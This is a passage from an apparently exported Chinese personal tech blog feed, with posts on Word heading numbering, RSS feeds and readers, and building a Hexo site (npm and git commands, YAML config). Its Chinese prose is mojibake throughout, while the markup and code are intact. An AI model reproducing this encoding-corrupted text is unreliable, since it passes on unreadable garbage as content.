<p><a href="http://bbs.csdn.net/" target="_blank" rel="noopener">CSDN</a> å·ç§°å…¨çƒæœ€å¤§ä¸­æ–‡ITç¤¾åŒºï¼Œç¤¾åŒºå†…çš„ <a href="https://code.csdn.net/" target="_blank" rel="noopener">CODE</a> æ¨¡å—ä¸ºå¼€å‘è€…æä¾›äº†ä»£ç æ‰˜ç®¡æœåŠ¡ï¼Œæ¯ä¸ªé¡¹ç›®çš„ä½¿ç”¨ç©ºé—´ä¸º<code>1GB</code>.</p>
<p>æœ¬äººç›®å‰ä½œä¸ºå­¦ç”Ÿå…šï¼Œæœ€å¸¸ç”¨çš„è¿˜æ˜¯ <code>Github</code> å’Œ <code>Coding</code> ï¼Œå¹³å°å†å¤šï¼Œè¿˜æ˜¯è¦é€‰æ‹©æœ€åˆé€‚è‡ªå·±çš„å˜›ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
            <tag> VS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Wordæ’ç‰ˆ - ç« èŠ‚ç¼–å·]]></title>
      <url>https://www.litreily.top/2016/12/28/word-numbering/</url>
      <content type="html"><![CDATA[<p>åœ¨è®ºæ–‡æ”¥å†™è¿‡ç¨‹ä¸­ï¼Œå°‘ä¸äº†å¯¹æ–‡æ¡£è¿›è¡Œæ’ç‰ˆï¼Œè€Œå¯¹ç« èŠ‚åç§°è¿›è¡Œç¼–å·å°±æ˜¯æ’ç‰ˆä¸­çš„ä¸€ç¯ï¼Œæœ¬æ–‡å°†ä»¥Word2016ä¸ºä¾‹è¿›è¡Œè¯´æ˜ã€‚</p>
<h2 id="æ·»åŠ æ ‡é¢˜å¹¶è®¾ç½®æ ‡é¢˜æ ·å¼"><a href="#æ·»åŠ æ ‡é¢˜å¹¶è®¾ç½®æ ‡é¢˜æ ·å¼" class="headerlink" title="æ·»åŠ æ ‡é¢˜å¹¶è®¾ç½®æ ‡é¢˜æ ·å¼"></a>æ·»åŠ æ ‡é¢˜å¹¶è®¾ç½®æ ‡é¢˜æ ·å¼</h2><p>åœ¨wordæ–‡æ¡£ä¸­æ·»åŠ å¥½æ ‡é¢˜ï¼Œç„¶åå¯¹å„ä¸ªæ ‡é¢˜æŒ‰å±‚çº§é¡ºåºè®¾ç½®å¥½å¯¹åº”çš„æ ‡é¢˜æ ·å¼ã€‚</p>
<p><img src="/assets/word/numbering/addTitle.png" alt="addTitle"></p>
<h2 id="é€‰æ‹©é»˜è®¤çš„å¤šçº§åˆ—è¡¨æ ·å¼"><a href="#é€‰æ‹©é»˜è®¤çš„å¤šçº§åˆ—è¡¨æ ·å¼" class="headerlink" title="é€‰æ‹©é»˜è®¤çš„å¤šçº§åˆ—è¡¨æ ·å¼"></a>é€‰æ‹©é»˜è®¤çš„å¤šçº§åˆ—è¡¨æ ·å¼</h2><p>åœ¨èœå•æ çš„â€œå¼€å§‹â€é€‰é¡¹å¡ä¸­é€‰æ‹©å¦‚ä¸‹æ‰€ç¤ºçš„å¤šçº§åˆ—è¡¨ï¼Œå•å‡»é€‰ä¸­åç‚¹å‡»åº•éƒ¨çš„â€œå®šä¹‰æ–°çš„å¤šçº§åˆ—è¡¨â€</p>
<p><img src="/assets/word/numbering/selectType.png" alt="selectType"></p>
<h2 id="å®šä¹‰æ–°çš„å¤šçº§åˆ—è¡¨"><a href="#å®šä¹‰æ–°çš„å¤šçº§åˆ—è¡¨" class="headerlink" title="å®šä¹‰æ–°çš„å¤šçº§åˆ—è¡¨"></a>å®šä¹‰æ–°çš„å¤šçº§åˆ—è¡¨</h2><p>åœ¨å¼¹å‡ºçš„è®¾ç½®ç•Œé¢ä¸­ç‚¹å‡»â€œæ›´å¤šâ€ï¼Œç„¶åä¾æ¬¡è®¾ç½®ä¸‰å±‚æ ‡é¢˜æ ·å¼</p>
<h3 id="ä¸€çº§æ ‡é¢˜"><a href="#ä¸€çº§æ ‡é¢˜" class="headerlink" title="ä¸€çº§æ ‡é¢˜"></a>ä¸€çº§æ ‡é¢˜</h3><p>åœ¨ç¼–å·æ ¼å¼ä¸­æ·»åŠ å‰ç¼€å’Œåç¼€ï¼Œåœ¨åé¢æ·»åŠ ä¸¤ä¸ªç©ºæ ¼ï¼Œå–æ¶ˆåˆ¶è¡¨ç¬¦ï¼Œå¹¶å°†æ–‡æœ¬ç¼©è¿›ä½ç½®è®¾ä¸º0å˜ç±³ï¼Œæœ€åå°†è¯¥æ ·å¼é“¾æ¥åˆ° â€œæ ‡é¢˜1â€ã€‚</p>
<p><img src="/assets/word/numbering/type1.png" alt="type1"></p>
<h3 id="äºŒçº§æ ‡é¢˜"><a href="#äºŒçº§æ ‡é¢˜" class="headerlink" title="äºŒçº§æ ‡é¢˜"></a>äºŒçº§æ ‡é¢˜</h3><p>ä¸ä¸€çº§æ ‡é¢˜ä¸åŒçš„æ˜¯ï¼ŒäºŒçº§æ ‡é¢˜éœ€è¦å‹¾é€‰å³ä¸‹æ–¹çš„ â€œæ­£è§„å½¢å¼ç¼–å·â€ã€‚</p>
<p><img src="/assets/word/numbering/type2.png" alt="type2"></p>
<h3 id="ä¸‰çº§æ ‡é¢˜"><a href="#ä¸‰çº§æ ‡é¢˜" class="headerlink" title="ä¸‰çº§æ ‡é¢˜"></a>ä¸‰çº§æ ‡é¢˜</h3><p>ä¸‰çº§æ ‡é¢˜å’ŒäºŒçº§æ ‡é¢˜çš„æ ·å¼ç±»ä¼¼ï¼Œç…§ç€æ¥ä¸€éå°±è¡Œã€‚</p>
<p><img src="/assets/word/numbering/type3.png" alt="type3"></p>
<h2 id="æ•ˆæœå±•ç¤º"><a href="#æ•ˆæœå±•ç¤º" class="headerlink" title="æ•ˆæœå±•ç¤º"></a>æ•ˆæœå±•ç¤º</h2><p>ç‚¹å‡»ç¡®å®šä»¥åï¼Œä¾¿å¯ä»¥çœ‹åˆ°æ‰€æœ‰æ ‡é¢˜éƒ½å·²ç»æŒ‰ç»™å®šæ ¼å¼æ·»åŠ å¥½äº†ç¼–å·ã€‚</p>
<p><img src="/assets/word/numbering/effect.png" alt="effect"></p>
<p>Notesï¼š</p>
<ol>
<li>ç”±äºæœ‰çš„ä¸€çº§æ ‡é¢˜å¯èƒ½ä¸éœ€è¦ç¼–å·ï¼Œå¦‚<strong>å‚è€ƒæ–‡çŒ®</strong>ï¼Œæ‰€ä»¥å¯ä»¥åœ¨è®¾è®¡å¤šçº§åˆ—è¡¨æ—¶æŠŠå³ä¸Šè§’çš„ â€œå°†çº§åˆ«é“¾æ¥åˆ°æ ·å¼â€ é€‰ä¸º â€œ(æ— æ ·å¼)â€ï¼Œè®¾ç½®å¥½åã€‚å¯¹äºéœ€è¦ç¼–å·çš„ä¸€çº§æ ‡é¢˜ï¼Œå¯ä»¥æ‰‹åŠ¨é€‰æ‹©æ ‡é¢˜åé€‰æ‹©è¯¥å¤šçº§åˆ—è¡¨æ ·å¼ã€‚</li>
<li>æ³¨æ„åƒä¸‡ä¸è¦åœ¨è®¾ç½®ç¼–å·çš„æ—¶å€™æŠŠé»˜è®¤çš„æ•°å­—1åˆ æ‰ï¼Œå³ä½¿è‡ªå·±åæ¥å†é‡æ–°å†™ä¸Šä¹Ÿä¸è¡Œï¼Œå› ä¸ºé»˜è®¤ç»™å®šçš„æ•°å­—éƒ½å…·æœ‰è‡ªåŠ¨ç¼–å·åŠŸèƒ½ï¼Œè‡ªå·±æ‰‹åŠ¨åŠ ä¸Šçš„å°†è§†ä¸ºå›ºå®šå­—ç¬¦è€Œæ— æ³•å®Œæˆè‡ªåŠ¨ç¼–å·ã€‚</li>
</ol>
]]></content>
      
        <categories>
            
            <category> æ‚ç‰©æŸœ </category>
            
        </categories>
        
        
        <tags>
            
            <tag> office </tag>
            
            <tag> word </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RSSç®€ä»‹]]></title>
      <url>https://www.litreily.top/2016/12/26/RSS-descr/</url>
      <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>ä¹‹å‰çœ‹åˆ°å¥½å¤šç½‘ç«™éƒ½æœ‰ä¸‹é¢è¿™ä¸ªå›¾æ ‡ï¼Œç„¶åç‚¹è¿›å»å°±å‡ºæ¥ä¸ª<code>xml</code>æ–‡ä»¶ï¼Œä¸€ç›´ä¸æ˜ç™½è¿™ä¸ªæ˜¯å¹²ä»€ä¹ˆçš„ï¼Œåæ¥è‡ªå·±ä½¿ç”¨<code>jekyll</code>åˆ›å»ºåšå®¢ï¼Œå‘ç°è‡ªåŠ¨ç”Ÿæˆäº†ä¸€ä¸ª<code>feed.xml</code>ï¼Œä¹Ÿä¸æ˜ç™½è¿™æ˜¯å¹²å•¥çš„ã€‚</p>
<p><img src="/assets/rss/rss.jpg" alt="RSS logo"></p>
<p>ç›´åˆ°è¿‘æ—¥ä½¿ç”¨<code>Hexo</code>åˆ›å»ºåšå®¢ï¼Œåˆé‡åˆ°<code>RSS</code>é…ç½®é—®é¢˜ï¼Œè¿™æ‰å†³å®šä¸€æ¢ç©¶ç«Ÿã€‚ç»è¿‡æœç´¢ï¼ŒçŸ¥é“ <code>RSS</code> (Really Simple Syndication, ç®€æ˜“ä¿¡æ¯èšåˆ)æ˜¯ä¸€ç§åŸºäº<code>XML</code>æ ‡å‡†ï¼Œå¹¿æ³›ç”¨äºäº’è”ç½‘çš„å†…å®¹åŒ…è£…å’ŒæŠ•é€’åè®®ã€‚</p>
<p>è€Œå‰é¢æ‰€è¯´çš„<code>feed.xml</code>å°±æ˜¯ä¸€ä¸ª<code>RSS</code>æ–‡ä»¶ï¼Œå½“æˆ‘ä»¬æŠŠrssæ–‡ä»¶é€šè¿‡é“¾æ¥å½¢å¼æ”¾åœ¨è‡ªå·±çš„åšå®¢ç½‘ç«™ä¸Šåï¼Œå…¶ä»–äººå°±èƒ½é€šè¿‡è¿™ä¸ªé“¾æ¥è®¢é˜…è‡ªå·±çš„åšå®¢äº†ã€‚</p>
<p>åœ¨è¿™ä¸ªä¿¡æ¯çˆ†ç‚¸çš„æ—¶ä»£ï¼Œä½¿ç”¨RSSè®¢é˜…èƒ½æ›´å¿«é€Ÿåœ°è·å–è‡ªå·±æƒ³è¦å…³æ³¨çš„ä¿¡æ¯ï¼Œé¿å…æµªè´¹å¤§é‡æ—¶é—´åœ¨ç½‘ç»œä¸Šæ¼«æ— ç›®çš„çš„çé€›ã€‚</p>
<h2 id="RSSæº"><a href="#RSSæº" class="headerlink" title="RSSæº"></a>RSSæº</h2><p>äº†è§£äº†ä»€ä¹ˆæ˜¯<code>rss</code>åï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“çš„å°±æ˜¯å¦‚æœè·å–RSSèµ„æºï¼Œç°åœ¨çš„å¤§éƒ¨åˆ†æ–°é—»ç½‘ç«™å’Œåšå®¢ç½‘ç«™éƒ½æä¾›äº†RSSè®¢é˜…åŠŸèƒ½ã€‚å¦‚ä½•åˆ†è¾¨ä¸€ä¸ªç½‘ç«™æ˜¯å¦æ”¯æŒRSSè®¢é˜…åŠŸèƒ½ï¼Œç›®å‰æˆ‘æ‰€çŸ¥é“çš„æ–¹æ³•åŒ…æ‹¬ï¼š</p>
<ol>
<li>æŸ¥æ‰¾ç½‘ç«™ä¸­çš„ RSS logo</li>
<li>æ ‡æ³¨äº† â€œRSSâ€ æ–‡å­—çš„åœ°æ–¹</li>
<li>æ ‡æ³¨äº† â€œè®¢é˜…â€ ç›¸å…³çš„é“¾æ¥</li>
</ol>
<p>å«Œéº»çƒ¦ï¼Œå½“ç„¶å¯ä»¥æ‰¾åˆ«äººå·²ç»æ€»ç»“å¥½çš„è®¢é˜…æºï¼š</p>
<ol>
<li><a href="https://www.zhihu.com/question/19580096" target="_blank" rel="noopener">çŸ¥ä¹-ä½ å¿…è¯»çš„ RSS è®¢é˜…æºæœ‰å“ªäº›ï¼Ÿ</a></li>
<li><a href="https://www.zhihu.com/question/19564031" target="_blank" rel="noopener">å“ªäº› RSS å€¼å¾—è®¢é˜…åˆ°é˜…è¯»å™¨ï¼Ÿ</a></li>
<li>æœ¬ç«™ç‚¹åšå®¢ï¼š<a href="http://www.litreily.top/atom.xml">http://www.litreily.top/atom.xml</a></li>
<li>æœ¬äººçš„Lofteråšå®¢ï¼š<a href="http://litreily.lofter.com/rss" target="_blank" rel="noopener">http://litreily.lofter.com/rss</a></li>
</ol>
<p>ä¸‹é¢è¿™äº›æ˜¯æˆ‘ç›®å‰è®¢é˜…çš„ä¸€äº›èµ„æºï¼š</p>
<ol>
<li>çŸ¥ä¹æ—¥æŠ¥ï¼š<a href="http://feeds.feedburner.com/zhihu-daily" target="_blank" rel="noopener">http://feeds.feedburner.com/zhihu-daily</a></li>
<li>çŸ¥ä¹æ¯æ—¥ç²¾é€‰ï¼š<a href="https://www.zhihu.com/rss" target="_blank" rel="noopener">https://www.zhihu.com/rss</a></li>
<li>æœˆå…‰åšå®¢ï¼š<a href="http://feed.williamlong.info/" target="_blank" rel="noopener">http://feed.williamlong.info/</a></li>
<li>ä¼˜è®¾-UISDCï¼š<a href="http://www.uisdc.com/feed" target="_blank" rel="noopener">http://www.uisdc.com/feed</a></li>
<li>å¼‚æ¬¡å…ƒè½¯ä»¶ä¸–ç•Œï¼š<a href="http://feed.iplaysoft.com/" target="_blank" rel="noopener">http://feed.iplaysoft.com/</a></li>
<li>å¤©æ¶¯å°ç­‘ï¼š<a href="http://tvfantasy.net/feed/" target="_blank" rel="noopener">http://tvfantasy.net/feed/</a></li>
<li>é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿—ï¼š<a href="http://www.ruanyifeng.com/blog/atom.xml" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/atom.xml</a></li>
<li>æå®¢å…¬å›­ï¼š<a href="http://www.geekpark.net/rss" target="_blank" rel="noopener">http://www.geekpark.net/rss</a></li>
<li>æå®¢èŒƒï¼š<a href="http://www.geekfan.net/feed/" target="_blank" rel="noopener">http://www.geekfan.net/feed/</a></li>
<li>äº’è”ç½‘çš„é‚£äº›äº‹ï¼š<a href="http://www.alibuybuy.com/feed" target="_blank" rel="noopener">http://www.alibuybuy.com/feed</a></li>
</ol>
<h2 id="RSSé˜…è¯»å™¨"><a href="#RSSé˜…è¯»å™¨" class="headerlink" title="RSSé˜…è¯»å™¨"></a>RSSé˜…è¯»å™¨</h2><p>æœ‰äº†RSSèµ„æºï¼Œè¯¥ç”¨ä»€ä¹ˆå·¥å…·æŸ¥çœ‹å‘¢ï¼Œè¿™ä¸ªé€šå¸¸åˆ†åœ¨çº¿å’Œç¦»çº¿ä¸¤ç§ã€‚</p>
<ul>
<li><p>åœ¨çº¿ç½‘ç«™ï¼š<a href="http://reader.youdao.com/" target="_blank" rel="noopener">æœ‰é“é˜…è¯»</a>ï¼Œ<a href="http://www.yilan.io/" target="_blank" rel="noopener">ä¸€è§ˆ</a> ...</p>
</li>
<li><p>ç¦»çº¿è½¯ä»¶ï¼š<a href="http://www.feeddemon.com/" target="_blank" rel="noopener">FeedDemon</a>ï¼Œ<a href="http://www.appinn.com/inoreader/" target="_blank" rel="noopener">inoreader</a> ...</p>
</li>
</ul>
<p>æ›´è¯¦ç»†çš„å¯ä»¥çœ‹è¿™ç¯‡ï¼š<a href="https://www.zhihu.com/question/28808592" target="_blank" rel="noopener">2015 å›½å†…æœ€å¥½çš„ RSS é˜…è¯»å™¨æ˜¯ä»€ä¹ˆï¼Ÿ</a></p>
<h3 id="FeedDemon"><a href="#FeedDemon" class="headerlink" title="FeedDemon"></a>FeedDemon</h3><p>æœ€åç®€å•è®²è®²æˆ‘ç°åœ¨ç”¨çš„ç¦»çº¿è½¯ä»¶ â€”â€” FeedDemonï¼Œç”¨æ³•æä¸ºç®€å•ï¼Œæ‰“å¼€è½¯ä»¶åä½¿ç”¨å¿«æ·é”® <code>Ctrl+N</code> æ‰“å¼€ <code>Subscrobe</code> æ·»åŠ ç•Œé¢ï¼Œè¾“å…¥rssæ–‡ä»¶é“¾æ¥åç‚¹å‡»ä¸¤æ¬¡<code>next</code>å³å¯ã€‚</p>
<p><img src="/assets/rss/feedDemon-addsite.png" alt="feedDemon-addSite"></p>
<p>ä¸‹é¢è¿™æ˜¯æˆ‘çš„è®¢é˜…æƒ…å†µ</p>
<p><img src="/assets/rss/feedDemon-sites.png" alt="feedDemon-sites"></p>
<p>Notes:</p>
<ol>
<li>å¦‚æœå½“å‰é¡µæ²¡æœ‰æ„Ÿå…´è¶£çš„æ–‡ç« ï¼Œå¯ä»¥ä½¿ç”¨å¿«æ·é”® <code>Ctrl+D</code> ç›´æ¥å°†æ•´é¡µè®¾ä¸ºâ€œå·²è¯»â€ï¼Œå¹¶è‡ªåŠ¨è·³è‡³ä¸‹ä¸€é¡µæˆ–ä¸‹ä¸€ä¸ªè®¢é˜…æºã€‚</li>
<li>è¯¥è½¯ä»¶åŒ…å«ä¸‰ç§åˆ—è¡¨æ¨¡å¼ï¼šæ ‡é¢˜ã€æ‘˜è¦å’Œå…¨æ–‡</li>
<li>è¯¥è½¯ä»¶åŒ…å«ä¸‰ç§æ’åºä¾æ®ï¼šè®¢é˜…æºã€æ—¶é—´å’Œæ ‡é¢˜</li>
</ol>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RSS </tag>
            
            <tag> Feed </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å»ºç«™æ—¥å¿—]]></title>
      <url>https://www.litreily.top/2016/12/12/blog-log/</url>
      <content type="html"><![CDATA[<p>ä½¿ç”¨ <code>hexo</code> å»ºç«™åï¼Œæ”¹ç”¨äº†æ–°çš„ä¸»é¢˜ï¼Œä½†å­˜åœ¨è®¸å¤šé—®é¢˜ï¼Œåç»­å°†ä¸æ–­ä¿®å¤æ›´æ–°ï¼Œæœ¬æ–‡å°†è®°å½•ä¸»è¦çš„æ›´æ–°å†…å®¹ã€‚</p>
<h2 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h2><p>åœ¨ä½¿ç”¨ <a href="https://github.com/yumemor/hexo-theme-primer" target="_blank" rel="noopener">primer</a> ä¸»é¢˜ä¹‹å‰ï¼Œæˆ‘ä½¿ç”¨ <code>jekyll</code> å»ºç«™ï¼Œé…åˆ <code>coding-pages</code> æœåŠ¡éƒ¨ç½²ç½‘ç«™ï¼Œç«™ç‚¹æ‰€æœ‰æ ·å¼å‡ä¸ºè‡ªå®šä¹‰ã€‚</p>
<h3 id="Infomation"><a href="#Infomation" class="headerlink" title="Infomation"></a>Infomation</h3><ul>
<li><code>jekyll</code> + <code>coding-pages</code> å»ºç«™</li>
<li><code>url</code>: <a href="http://www.litreily.top/">www.litreily.top</a></li>
<li>è¯„è®ºç³»ç»Ÿï¼š<code>disqus</code> | å‹è¨€</li>
<li>ç»Ÿè®¡æœåŠ¡ï¼š<a href="http://tongji.baidu.com/" target="_blank" rel="noopener">ç™¾åº¦ç»Ÿè®¡</a></li>
</ul>
<h3 id="Display"><a href="#Display" class="headerlink" title="Display"></a>Display</h3><p><img src="/assets/log/jekyll_home.png" alt="jekyll-homepage"></p>
<p><img src="/assets/log/jekyll_blog.png" alt="jekyll-blogpage"></p>
<p><img src="/assets/log/jekyll_category.png" alt="jekyll-category"></p>
<p><img src="/assets/log/jekyll_about.png" alt="jekyll-about"></p>
<h2 id="2016-12-11"><a href="#2016-12-11" class="headerlink" title="2016-12-11"></a>2016-12-11</h2><p>ç»å¥½å‹ <a href="https://www.smslit.top/" target="_blank" rel="noopener">smslit</a> æ¨èï¼Œä½¿ç”¨ <code>hexo</code> ä¸»é¢˜å»ºç«™ï¼Œçº ç»“è®¸ä¹…åå†³å®šä½¿ç”¨ <code>primer</code> ä¸»é¢˜ï¼Œå¹¶æ ¹æ®ä¸ªäººéœ€æ±‚è¿›è¡Œå®šåˆ¶å’Œä¼˜åŒ–ã€‚å¥½äº†ï¼Œä¸‹é¢å¯¹å»ºç«™è¿‡ç¨‹è¿›è¡Œç®€è¦ä»‹ç»ã€‚</p>
<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><ul>
<li>å®‰è£… <code>hexo</code></li>
</ul>
<p>åœ¨ç¡®ä¿å®‰è£…å¥½ <a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a> ä»¥åŠ <a href="https://git-scm.com/downloads" target="_blank" rel="noopener">git</a> çš„æƒ…å†µä¸‹æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤</p>
<pre><code class="bash">npm install hexo-cli -g
hexo init hexoBlog
cd hexoBlog
npm install
</code></pre>
<p><code>hexo</code>ç³»ç»Ÿé»˜è®¤ä¸‹è½½ä¸»é¢˜ <a href="https://github.com/hexojs/hexo-theme-landscape" target="_blank" rel="noopener">landscape</a> ï¼ŒæŠ˜è…¾äº†ä¸€å°ä¼šè§‰å¾—é™¤äº†ä»£ç é«˜äº®ä¸é”™å¤–ï¼Œå…¶å®ƒæ ·å¼ç•¥æ˜¾ä¸€èˆ¬ï¼Œæ‰€ä»¥ç›´æ¥æ”¾å¼ƒï¼Œæ”¹ç”¨ <a href="https://github.com/yumemor/hexo-theme-primer" target="_blank" rel="noopener">primer</a>ã€‚</p>
<ul>
<li>ä¸‹è½½ <code>primer</code></li>
</ul>
<p>åœ¨ <code>hexoBlog\themes</code> ç›®å½•ä¸‹å…‹éš†ä¸»é¢˜</p>
<pre><code class="bash">git clone https://github.com/yumemor/hexo-theme-primer.git
</code></pre>
<ul>
<li>æ–°å»º <code>github</code> è¿œç¨‹ä»“åº“</li>
</ul>
<p>ä¸ºäº†ä½¿ç”¨ <code>github pages</code> ,éœ€è¦å°†ä»“åº“åç§°è®¾ä¸º <code>[username].github.io</code> ï¼Œåç»­é…ç½® <code>_config.yml</code> æ—¶ï¼Œéœ€è¦å°† <code>deploy</code> çš„å±æ€§ <code>repo</code> è®¾ä¸ºè¯¥ä»“åº“ç›®å½•ã€‚</p>
<ul>
<li>å®‰è£…æ’ä»¶</li>
</ul>
<p>ä¸ºäº†ä½¿ç”¨ <code>hexo</code> çš„å‘å¸ƒåŠŸèƒ½ã€ç«™å†…æœç´¢ç­‰åŠŸèƒ½ï¼Œéœ€è¦å®‰è£…ä»¥ä¸‹æ’ä»¶</p>
<pre><code class="bash">npm install hexo-server --save
npm install hexo-renderer-less --save
npm install hexo-generator-feed --save
npm install hexo-generator-search --save
</code></pre>
<h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><ul>
<li>ä¿®æ”¹ <strong>æ ¹ç›®å½•</strong> ä¸‹çš„ <code>_config.yml</code></li>
</ul>
<pre><code class="YAML"># Site
title: LITREILY
subtitle: simple life
description: Stay Hungry, Stay Foolish
author: litreily
language: default
email: 707922098@qq.com

# URL
url: www.litreily.top/

# Writing
## transplant from jekyll system which post-name write  with date
## so it&#39;s needed to change the name of new posts
new_post_name: :year-:month-:day-:title.markdown

# Pagination
## Set per_page to 0 to disable pagination
per_page: 8
pagination_dir: page

# Extensions
## Plugins: https://hexo.io/plugins/
## Themes: https://hexo.io/themes/
theme: primer

# Deployment
## Docs: https://hexo.io/docs/deployment.html
deploy:
  type: git
  repo: git@github.com:Litreily/Litreily.github.io.git
  branch: master

# Search
search:
  path: search.xml
  field: post
</code></pre>
<ul>
<li>ä¿®æ”¹ <strong>ä¸»é¢˜ç›®å½•</strong> ä¸‹çš„ <code>_config.yml</code></li>
</ul>
<pre><code class="YAML">menus:
    -
        name: é¦–é¡µ
        link: /
    -
        name: åˆ†ç±»
        link: categories/
    -
        name: å¼€æºé¡¹ç›®
        link: open-source/
    -
        name: ç•™è¨€æ¿
        link: message/

# Profile
profile:
    location: QingDao, China
    github: litreily
    organization: upc

# Github
github:
  username: litreily
  popular_repos: [hexoBlogProject,jekyllBlog,Student]

# Comments
youyan_username: litreily
duoshuo_username: litreily # å¤šè¯´é…ç½®
#disqus_username: litreily # disqus é…ç½®

# Search
## google | local
search:
    use: local
</code></pre>
<h3 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h3><ul>
<li><p>å°† <code>jekyll</code> ç³»ç»Ÿä¸­çš„åšå®¢å¤åˆ¶åˆ°æ–‡ä»¶å¤¹ <code>/source/_posts</code> ä¸­</p>
</li>
<li><p>å‘å¸ƒåšå®¢</p>
</li>
</ul>
<pre><code class="bash">hexo clean
hexo generate
hexo deploy
</code></pre>
<ul>
<li>æœ¬åœ°æœåŠ¡å™¨</li>
</ul>
<pre><code class="bash">hexo serve
</code></pre>
<h3 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h3><ul>
<li>è§£å†³ä»£ç é«˜äº®ä¸æ­£å¸¸é—®é¢˜</li>
</ul>
<p>ç”±äº <code>primer</code>ä¸»é¢˜è‡ªå¸¦é«˜äº®æ ·å¼ï¼Œæ‰€ä»¥éœ€è¦å°†åŸæœ‰æ ·å¼ç¦ç”¨ï¼Œä¿®æ”¹ <strong>æ ¹ç›®å½•</strong> ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶</p>
<pre><code class="YAML">highlight:
  enable: false
  line_number: false
  auto_detect: false
  tab_replace:
</code></pre>
<ul>
<li>è§£å†³é¦–é¡µæ˜¾ç¤ºå…¨éƒ¨åšæ–‡é—®é¢˜</li>
</ul>
<p>é¦–æ¬¡ä½¿ç”¨ <code>primer</code> ä¸»é¢˜ï¼ŒæˆåŠŸå‘å¸ƒåå‘ç°ä¸»é¡µåšå®¢åˆ—è¡¨æ˜¾ç¤ºäº†æ•´ä¸ªåšæ–‡å†…å®¹ï¼Œè€Œéæ‘˜è¦ï¼Œåæ¥æŸ¥æ‰¾ä¸»é¢˜æ–‡ä»¶å‘ç°åŸä¸»äººä½¿ç”¨äº† <code>excerpt</code> å˜é‡ï¼Œè€Œæˆ‘åŸå…ˆä½¿ç”¨çš„å‡æ˜¯ <code>description</code> ï¼Œæ‰€ä»¥å°†ä¸»é¢˜æ–‡ä»¶ <code>primer\layout\_partial\article.ejs</code> ä¸­çš„ <code>excerpt</code> æ›¿æ¢ä¸º <code>description</code> åä¾¿å¯ä»¥äº†ã€‚</p>
<ul>
<li>è§£å†³ç•™è¨€æ¿æ ·å¼ä¸æ­£å¸¸é—®é¢˜</li>
</ul>
<p>é¦–å…ˆéœ€è¦è¯´æ˜çš„æ˜¯ï¼Œ <code>primer</code> ä¸»é¢˜è‡ªå¸¦ <strong>é¦–é¡µ</strong>ã€<strong>åˆ†ç±»</strong> ã€ <strong>å¼€æºé¡¹ç›®</strong> å’Œ <strong>ç•™è¨€æ¿</strong> 4ä¸ªé¡µé¢ï¼Œå½“ç„¶åœ¨ä½¿ç”¨æ—¶ï¼Œéœ€è¦é€šè¿‡</p>
<pre><code class="bash">hexo new page categories
hexo new page open-source
hexo new page message
</code></pre>
<p>åˆ›å»ºå¥½é™¤é¦–é¡µå¤–çš„å…¶å®ƒä¸‰ä¸ªé¡µé¢åï¼Œå› ä¸ºä¸»é¢˜ä¸­éƒ½æœ‰ <code>layout</code> æ–‡ä»¶ <code>categories.ejs</code> ä¸ <code>open.ejs</code>ä¸ä¹‹å¯¹åº”ï¼Œæ‰€ä»¥<code>category</code> å’Œ <code>open-source</code> éƒ½èƒ½å¤Ÿæ­£å¸¸æ˜¾ç¤ºã€‚</p>
<p>è€Œ <code>message</code> é¡µé¢å¹¶æ²¡æœ‰ï¼Œå®ƒé»˜è®¤ä½¿ç”¨ <code>layout:page</code> ï¼Œå¯¼è‡´é¡µé¢ä¸­ä¿ç•™äº†ç›®å½•æ å’Œåˆ†äº«æ ï¼Œè€Œè¿™å¹¶ä¸æ˜¯æˆ‘æƒ³è¦çš„ï¼Œæ‰€ä»¥æˆ‘åœ¨ <code>primer\layout\_partial\</code> ä¸­æ·»åŠ  <code>message.ejs</code> æ–‡ä»¶ï¼Œåœ¨ <code>article-post.ejs</code> æ–‡ä»¶åŸºç¡€ä¸Šåˆ é™¤äº†å¤šä½™é¡¹ã€‚</p>
<p>æœ€ååœ¨ <code>primer\layout\</code> ä¸­æ·»åŠ  <code>message.ejs</code>ï¼ˆä¸<code>_partial</code>æ–‡ä»¶å¤¹ä¸­çš„ä¸åŒï¼‰æ–‡ä»¶ï¼Œå†™å…¥ä»¥ä¸‹å†…å®¹å³å¯ã€‚</p>
<pre><code class="html">&lt;body&gt;
    &lt;%- partial(&#39;_partial/header&#39;) %&gt;
    &lt;%- partial(&#39;_partial/banner-post&#39;,{post: page,index: true}) %&gt;
    &lt;%- partial(&#39;_partial/message&#39;,{post: page,index: false}) %&gt;
</code></pre>
<ul>
<li>categories ä¸ tags</li>
</ul>
<p>åœ¨ <code>jekyll</code> ä¸­ï¼Œåˆ†ç±»ä¸æ ‡ç­¾åŸºæœ¬æ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œä½†åœ¨ <code>hexo</code> å´æˆªç„¶ä¸åŒï¼Œ <code>categories</code> æœ‰çº§åˆ«ä¹‹åˆ†ï¼ˆæŒ‰å…ˆåé¡ºåºåˆ†çº§ï¼‰ï¼Œè€Œ <code>tags</code> å¹¶æ²¡æœ‰ã€‚æ‰€ä»¥éœ€è¦å°†åŸæœ‰åšå®¢é‡æ–°å½’ç±»å¹¶è®¾ç½®æ ‡ç­¾ã€‚</p>
<h2 id="2016-12-12"><a href="#2016-12-12" class="headerlink" title="2016-12-12"></a>2016-12-12</h2><ul>
<li>å°†è¯„è®ºç³»ç»Ÿæ”¹ä¸º <a href="http://duoshuo.com/" target="_blank" rel="noopener">å¤šè¯´</a></li>
